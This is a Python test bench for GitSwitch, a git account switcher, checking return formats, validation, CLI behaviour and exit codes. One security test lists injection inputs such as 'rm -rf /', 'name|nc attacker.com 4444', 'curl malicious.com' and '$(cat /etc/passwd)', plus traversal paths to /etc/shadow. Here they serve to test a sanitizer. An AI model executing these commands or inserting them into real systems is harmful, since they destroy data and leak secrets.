#!/usr/bin/env python3
"""
GitSwitch Test Bench - Comprehensive Status Code Validation

This test bench validates the core status code standardization by testing:
1. Tuple return formats across all manager methods
2. Success/failure logic consistency  
3. Error handling and message quality
4. Security function behavior
5. CLI integration and exit code translation

Usage:
    python test_bench.py [--verbose] [--category=<category>]
    
Categories: managers, validation, security, cli_integration, exit_codes, all
"""

import argparse
import os
import sys
import tempfile
import shutil
import subprocess
from pathlib import Path
from typing import Dict, Any, Tuple

try:
    from gitswitch import (
        ConfigManager, AccountManager, ValidationService, GitOperations,
        GitSwitchCLI, validate_email, normalize_account_key
    )
    from gitswitch.colors import set_color_mode, format_status, format_header
    from gitswitch.utils import sanitize_git_input, validate_git_config_key, validate_gpg_key_format, validate_ssh_key_path
except ImportError as e:
    print(f"[ERROR] Failed to import gitswitch: {e}")
    sys.exit(1)


class ComprehensiveTestBench:
    """Comprehensive test bench that actually validates status code promises."""
    
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.test_dir = None
        self.passed = 0
        self.failed = 0
        self.test_results = []
        
        set_color_mode(True)
    
    def setup_test_environment(self):
        """Create isolated test environment."""
        self.test_dir = Path(tempfile.mkdtemp(prefix="gitswitch_comprehensive_test_"))
        if self.verbose:
            print(f"{format_status('[INFO]')} Test environment: {self.test_dir}")
        
        self.config_manager = ConfigManager(self.test_dir / "test_config.toml")
        self.account_manager = AccountManager(self.config_manager)
        self.validation_service = ValidationService()
        self.git_ops = GitOperations()
    
    def teardown_test_environment(self):
        """Clean up test environment."""
        if self.test_dir and self.test_dir.exists():
            shutil.rmtree(self.test_dir)
    
    def assert_test(self, test_name: str, condition: bool, message: str = ""):
        """Assert a test condition with proper tracking."""
        if condition:
            self.passed += 1
            status = format_status("[PASS]")
            self.test_results.append((test_name, True, message))
        else:
            self.failed += 1
            status = format_status("[FAIL]")
            self.test_results.append((test_name, False, message))
        
        if self.verbose or not condition:
            print(f"  {status} {test_name}: {message}")
    
    def validate_tuple_format(self, test_name: str, result: tuple, expected_length: int, 
                             success_index: int = 0) -> bool:
        """Validate tuple format and return success for chaining."""
        if not isinstance(result, tuple):
            self.assert_test(f"{test_name}_tuple_type", False, f"Expected tuple, got {type(result)}")
            return False
        
        if len(result) != expected_length:
            self.assert_test(f"{test_name}_tuple_length", False, f"Expected {expected_length} items, got {len(result)}")
            return False
        
        if not isinstance(result[success_index], bool):
            self.assert_test(f"{test_name}_success_type", False, f"Expected bool at index {success_index}, got {type(result[success_index])}")
            return False
        
        self.assert_test(f"{test_name}_tuple_format", True, "Correct tuple format")
        return True

    # ========== MANAGER METHODS TUPLE TESTING ==========
    
    def test_config_manager_tuples(self):
        """Test that ALL ConfigManager methods return proper tuples."""
        print(f"\n{format_header('Testing ConfigManager Tuple Returns')}...")
        
        # Test create_default_config
        result = self.config_manager.create_default_config()
        if self.validate_tuple_format("create_default_config", result, 2):
            success, message = result
            self.assert_test("create_default_config_success", success, message)
        
        # Test load_config
        result = self.config_manager.load_config()
        if self.validate_tuple_format("load_config", result, 3):
            success, config, message = result
            self.assert_test("load_config_success", success, message)
            self.assert_test("load_config_returns_dict", isinstance(config, dict), f"Expected dict, got {type(config)}")
        
        # Test save_config
        test_config = {"settings": {"default_scope": "local"}, "accounts": {}}
        result = self.config_manager.save_config(test_config)
        if self.validate_tuple_format("save_config", result, 2):
            success, message = result
            self.assert_test("save_config_success", success, message)
        
        # Test get_default_scope
        result = self.config_manager.get_default_scope()
        if self.validate_tuple_format("get_default_scope", result, 3):
            success, scope, message = result
            self.assert_test("get_default_scope_success", success, message)
            self.assert_test("get_default_scope_valid", scope in ["local", "global"], f"Invalid scope: {scope}")
        
        # Test backup_config
        result = self.config_manager.backup_config()
        if self.validate_tuple_format("backup_config", result, 3):
            success, backup_path, message = result
            self.assert_test("backup_config_success", success, message)
    
    def test_account_manager_tuples(self):
        """Test that ALL AccountManager methods return proper tuples."""
        print(f"\n{format_header('Testing AccountManager Tuple Returns')}...")
        
        # Clear any existing accounts first
        success, config, _ = self.config_manager.load_config()
        if success:
            config["accounts"] = {}
            self.config_manager.save_config(config)
        
        # Test get_accounts (empty)
        result = self.account_manager.get_accounts()
        if self.validate_tuple_format("get_accounts_empty", result, 3):
            success, accounts, message = result
            self.assert_test("get_accounts_empty_success", success, message)
            self.assert_test("get_accounts_returns_dict", isinstance(accounts, dict), f"Expected dict, got {type(accounts)}")
        
        # Test add_account
        valid_account = {
            "name": "Test User", "email": "test@example.com", "description": "Test Account",
            "preferred_scope": "local", "gpg_key": "", "signing_enabled": False, "ssh_key": "", "ssh_host": ""
        }
        result = self.account_manager.add_account(valid_account)
        if self.validate_tuple_format("add_account", result, 3):
            success, account_num, message = result
            self.assert_test("add_account_success", success, message)
            self.assert_test("add_account_valid_num", isinstance(account_num, int) and account_num > 0, f"Expected positive int, got {account_num}")
            
            # Test get_account with the added account
            result = self.account_manager.get_account(str(account_num))
            if self.validate_tuple_format("get_account", result, 4):
                success, found_num, found_account, message = result
                self.assert_test("get_account_success", success, message)
                self.assert_test("get_account_correct_data", found_num == account_num and found_account["name"] == "Test User", "Account data mismatch")
            
            # Test search_accounts
            result = self.account_manager.search_accounts("Test")
            if self.validate_tuple_format("search_accounts", result, 3):
                success, matches, message = result
                self.assert_test("search_accounts_success", success, message)
                self.assert_test("search_accounts_finds_account", len(matches) > 0, "Should find test account")
            
            # Test update_account
            updated_account = valid_account.copy()
            updated_account["description"] = "Updated Test Account"
            result = self.account_manager.update_account(account_num, updated_account)
            if self.validate_tuple_format("update_account", result, 2):
                success, message = result
                self.assert_test("update_account_success", success, message)
            
            # Test get_account_preferred_scope
            result = self.account_manager.get_account_preferred_scope(valid_account)
            if self.validate_tuple_format("get_account_preferred_scope", result, 3):
                success, scope, message = result
                self.assert_test("get_account_preferred_scope_success", success, message)
            
            # Test remove_account
            result = self.account_manager.remove_account(account_num)
            if self.validate_tuple_format("remove_account", result, 2):
                success, message = result
                self.assert_test("remove_account_success", success, message)
        
        # Test failure cases
        result = self.account_manager.get_account("999")
        if self.validate_tuple_format("get_nonexistent_account", result, 4):
            success, found_num, found_account, message = result
            self.assert_test("get_nonexistent_account_fails", not success, "Should fail for non-existent account")
            self.assert_test("get_nonexistent_account_returns_neg1", found_num == -1, f"Expected -1, got {found_num}")
    
    def test_validation_service_comprehensive(self):
        """Test ALL ValidationService methods thoroughly."""
        print(f"\n{format_header('Testing ValidationService Comprehensively')}...")
        
        # Test validate_account with valid data
        valid_account = {"name": "Test", "email": "test@example.com", "description": "Test", "preferred_scope": "local"}
        result = self.validation_service.validate_account(valid_account)
        if self.validate_tuple_format("validate_account_valid", result, 3):
            is_valid, errors, warnings = result
            self.assert_test("validate_account_valid_passes", is_valid, f"Valid account should pass: {errors}")
            self.assert_test("validate_account_returns_lists", isinstance(errors, list) and isinstance(warnings, list), "Should return lists")
        
        # Test validate_account with invalid data
        invalid_account = {"name": "", "email": "invalid", "description": "", "preferred_scope": "invalid"}
        result = self.validation_service.validate_account(invalid_account)
        if self.validate_tuple_format("validate_account_invalid", result, 3):
            is_valid, errors, warnings = result
            self.assert_test("validate_account_invalid_fails", not is_valid, "Invalid account should fail")
            self.assert_test("validate_account_has_errors", len(errors) > 0, "Should have validation errors")
        
        # Test validate_config
        test_config = {"settings": {"default_scope": "local"}, "accounts": {"1": valid_account}}
        result = self.validation_service.validate_config(test_config)
        if self.validate_tuple_format("validate_config", result, 3):
            is_valid, errors, warnings = result
            self.assert_test("validate_config_valid_passes", is_valid, f"Valid config should pass: {errors}")
        
        # Test validate_system_requirements
        result = self.validation_service.validate_system_requirements()
        if self.validate_tuple_format("validate_system_requirements", result, 3):
            is_valid, errors, warnings = result
            # Don't assert success/failure as it depends on system, just that it returns properly
            self.assert_test("validate_system_requirements_returns_properly", True, "Returns proper tuple format")
        
        # Test get_system_info
        system_info = self.validation_service.get_system_info()
        self.assert_test("get_system_info_returns_dict", isinstance(system_info, dict), f"Expected dict, got {type(system_info)}")
    
    # ========== SECURITY FUNCTION TESTING ==========
    
    def test_security_functions(self):
        """Test critical security functions that prevent injection attacks."""
        print(f"\n{format_header('Testing Security Functions')}...")
        
        # Test sanitize_git_input with injection attempts
        dangerous_inputs = [
            "name; rm -rf /",
            "name && curl malicious.com",
            "name`whoami`",
            "name$(cat /etc/passwd)",
            "name|nc attacker.com 4444",
            "name<script>alert('xss')</script>",
            "name\n\rmalicious",
            "name\t\tmalicious"
        ]
        
        for dangerous_input in dangerous_inputs:
            result = sanitize_git_input(dangerous_input)
            self.assert_test(f"sanitize_removes_dangerous_chars", 
                           not any(char in result for char in [";", "&", "|", "`", "$", "<", ">", "\n", "\r", "\t"]),
                           f"Should remove dangerous chars from: {dangerous_input}")
        
        # Test validate_git_config_key
        valid_keys = ["user.name", "user.email", "commit.gpgsign", "remote.origin.url"]
        invalid_keys = ["", "invalid key", "user..name", "1user.name", "user.name.", "a" * 300]
        
        for key in valid_keys:
            self.assert_test(f"validate_git_config_key_accepts_valid", validate_git_config_key(key), f"Should accept valid key: {key}")
        
        for key in invalid_keys:
            self.assert_test(f"validate_git_config_key_rejects_invalid", not validate_git_config_key(key), f"Should reject invalid key: {key}")
        
        # Test validate_gpg_key_format - UPDATED TO USE VALID HEX
        valid_gpg_keys = [
            "ABCD1234",                                          # 8 char uppercase
            "abcd1234",                                          # 8 char lowercase
            "AbCd1234",                                          # 8 char mixed case
            "ABCD1234ABCD5678",                                  # 16 char uppercase (valid hex)
            "abcd1234abcd5678",                                  # 16 char lowercase (valid hex)
            "ABCD1234abcd5678",                                  # 16 char mixed case (valid hex)
            "ABCD1234ABCD5678ABCD9012ABCD3456ABCD7890",        # 40 char uppercase (valid hex)
            "abcd1234abcd5678abcd9012abcd3456abcd7890",        # 40 char lowercase (valid hex)
        ]
        invalid_gpg_keys = [
            "",                                                  # empty
            "123",                                               # too short
            "GHIJ5678",                                          # has non-hex chars 'G', 'H', 'I', 'J'
            "ABCD123",                                           # 7 chars (not 8)
            "ABCD1234ABCD567",                                   # 15 chars (not 16)
            "ABCD1234ABCD5678ABCD9012ABCD3456ABCD78901",       # 41 chars (not 40)
            "ABCD123G",                                          # has non-hex char 'G'
        ]
        
        for key in valid_gpg_keys:
            self.assert_test(f"validate_gpg_key_format_accepts_valid", validate_gpg_key_format(key), f"Should accept valid GPG key: {key}")
        
        for key in invalid_gpg_keys:
            self.assert_test(f"validate_gpg_key_format_rejects_invalid", not validate_gpg_key_format(key), f"Should reject invalid GPG key: {key}")
        
        # Test validate_ssh_key_path
        safe_paths = ["~/.ssh/id_rsa", "/etc/ssh/ssh_host_rsa_key", "./.ssh/test_key"]
        unsafe_paths = ["../../etc/passwd", "/root/.ssh/id_rsa", "../../../etc/shadow", "~/.ssh/../../../etc/passwd"]
        
        for path in safe_paths:
            # Note: This tests the validation logic, not actual file existence
            result = validate_ssh_key_path(path)
            # Just test that it doesn't crash and returns a boolean
            self.assert_test(f"validate_ssh_key_path_returns_bool", isinstance(result, bool), f"Should return bool for: {path}")
        
        for path in unsafe_paths:
            result = validate_ssh_key_path(path)
            self.assert_test(f"validate_ssh_key_path_rejects_unsafe", not result, f"Should reject unsafe path: {path}")
    
    # ========== CLI INTEGRATION TESTING ==========
    
    def test_cli_integration(self):
        """Test that CLI methods properly handle manager tuple returns."""
        print(f"\n{format_header('Testing CLI Integration')}...")
        
        cli = GitSwitchCLI()
        cli.config_manager = self.config_manager
        cli.account_manager = self.account_manager
        
        # Test that CLI commands return booleans (not tuples)
        commands_to_test = [
            ("handle_list_command", lambda: cli.handle_list_command()),
            ("handle_status_command", lambda: cli.handle_status_command()),
            ("handle_validate_command", lambda: cli.handle_validate_command("system")),
        ]
        
        for command_name, command_func in commands_to_test:
            try:
                result = command_func()
                self.assert_test(f"{command_name}_returns_bool", isinstance(result, bool), f"Expected bool, got {type(result)}")
                # Most commands should succeed in test environment
                self.assert_test(f"{command_name}_succeeds", result, f"Command should succeed: {command_name}")
            except Exception as e:
                self.assert_test(f"{command_name}_no_exception", False, f"Command raised exception: {e}")
        
        # Test display manager methods return tuples
        display_methods = [
            ("show_accounts", lambda: cli.display.show_accounts()),
            ("show_config_location", lambda: cli.display.show_config_location()),
            ("show_scope_status", lambda: cli.display.show_scope_status()),
            ("show_current_config", lambda: cli.display.show_current_config()),
        ]
        
        for method_name, method_func in display_methods:
            try:
                result = method_func()
                self.assert_test(f"{method_name}_returns_tuple", isinstance(result, tuple), f"Expected tuple, got {type(result)}")
                if isinstance(result, tuple) and len(result) == 2:
                    success, message = result
                    self.assert_test(f"{method_name}_tuple_format", isinstance(success, bool), f"First element should be bool")
            except Exception as e:
                self.assert_test(f"{method_name}_no_exception", False, f"Method raised exception: {e}")
    
    # ========== EXIT CODE TESTING ==========
    
    def test_exit_codes(self):
        """Test actual CLI exit codes via subprocess."""
        print(f"\n{format_header('Testing Actual CLI Exit Codes')}...")
        
        # Try to find gitswitch executable
        gitswitch_cmd = None
        for potential_cmd in ["gitswitch", "python -m gitswitch", "./gitswitch"]:
            try:
                result = subprocess.run(potential_cmd.split() + ["--help"], 
                                      capture_output=True, timeout=5)
                if result.returncode == 0:
                    gitswitch_cmd = potential_cmd
                    break
            except:
                continue
        
        if not gitswitch_cmd:
            self.assert_test("exit_code_testing_skipped", True, "Gitswitch not found in PATH - skipping exit code tests")
            return
        
        # Test successful commands (should exit 0)
        success_commands = [
            (["--help"], "help command"),
            (["list"], "list command"),
            (["status"], "status command"),
        ]
        
        for cmd_args, description in success_commands:
            try:
                result = subprocess.run(gitswitch_cmd.split() + cmd_args, 
                                      capture_output=True, timeout=10)
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_success", 
                               result.returncode == 0, 
                               f"{description} should exit 0, got {result.returncode}")
            except subprocess.TimeoutExpired:
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_timeout", False, f"{description} timed out")
            except Exception as e:
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_error", False, f"{description} error: {e}")
        
        # Test failing commands (should exit 1)
        fail_commands = [
            (["999"], "non-existent account"),
            (["nonexistent_command"], "invalid command"),
        ]
        
        for cmd_args, description in fail_commands:
            try:
                result = subprocess.run(gitswitch_cmd.split() + cmd_args, 
                                      capture_output=True, timeout=10)
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_failure", 
                               result.returncode == 1, 
                               f"{description} should exit 1, got {result.returncode}")
            except subprocess.TimeoutExpired:
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_timeout", False, f"{description} timed out")
            except Exception as e:
                self.assert_test(f"exit_code_{description.replace(' ', '_')}_error", False, f"{description} error: {e}")
    
    # ========== MAIN TEST RUNNER ==========
    
    def run_category(self, category: str):
        """Run tests for a specific category."""
        if category == "managers":
            self.test_config_manager_tuples()
            self.test_account_manager_tuples()
        elif category == "validation":
            self.test_validation_service_comprehensive()
        elif category == "security":
            self.test_security_functions()
        elif category == "cli_integration":
            self.test_cli_integration()
        elif category == "exit_codes":
            self.test_exit_codes()
        elif category == "all":
            self.test_config_manager_tuples()
            self.test_account_manager_tuples()
            self.test_validation_service_comprehensive()
            self.test_security_functions()
            self.test_cli_integration()
            self.test_exit_codes()
        else:
            print(f"{format_status('[ERROR]')} Unknown test category: {category}")
            return False
        return True
    
    def print_summary(self):
        """Print comprehensive test summary."""
        total = self.passed + self.failed
        pass_rate = (self.passed / total * 100) if total > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"{format_header('COMPREHENSIVE TEST SUMMARY')}")
        print(f"{'='*70}")
        print(f"Total Tests: {total}")
        print(f"Passed: {self.passed} {format_status('[PASS]')}")
        print(f"Failed: {self.failed} {format_status('[FAIL]')}") 
        print(f"Pass Rate: {pass_rate:.1f}%")
        
        if self.failed > 0:
            print(f"\n{format_status('[FAIL]')} FAILED TESTS:")
            for test_name, passed, message in self.test_results:
                if not passed:
                    print(f"  • {test_name}: {message}")
        
        # Categorize results
        categories = {}
        for test_name, passed, message in self.test_results:
            category = test_name.split('_')[0] if '_' in test_name else 'other'
            if category not in categories:
                categories[category] = {'passed': 0, 'failed': 0}
            if passed:
                categories[category]['passed'] += 1
            else:
                categories[category]['failed'] += 1
        
        print(f"\n{format_header('RESULTS BY CATEGORY')}:")
        for category, results in categories.items():
            total_cat = results['passed'] + results['failed']
            rate = (results['passed'] / total_cat * 100) if total_cat > 0 else 0
            status = format_status('[PASS]') if results['failed'] == 0 else format_status('[FAIL]')
            print(f"  {category}: {results['passed']}/{total_cat} ({rate:.1f}%) {status}")
        
        if self.failed == 0:
            print(f"\n{format_status('[SUCCESS]')} ALL TESTS PASSED!")
            print("Status code standardization is working correctly.")
        else:
            print(f"\n{format_status('[WARN]')} Some tests failed.")
            print("Status code standardization needs attention.")
        
        print(f"{'='*70}")


def main():
    """Main test runner."""
    parser = argparse.ArgumentParser(description="Comprehensive GitSwitch Test Bench")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
    parser.add_argument("--category", "-c", default="all",
                       choices=["managers", "validation", "security", "cli_integration", "exit_codes", "all"],
                       help="Test category to run")
    
    args = parser.parse_args()
    
    print(f"{format_header('GitSwitch Comprehensive Test Bench')}")
    print("Testing status code standardization and core functionality")
    print("=" * 70)
    
    test_bench = ComprehensiveTestBench(verbose=args.verbose)
    
    try:
        test_bench.setup_test_environment()
        
        if test_bench.run_category(args.category):
            test_bench.print_summary()
            exit_code = 0 if test_bench.failed == 0 else 1
            sys.exit(exit_code)
        else:
            sys.exit(1)
            
    finally:
        test_bench.teardown_test_environment()


if __name__ == "__main__":
    main()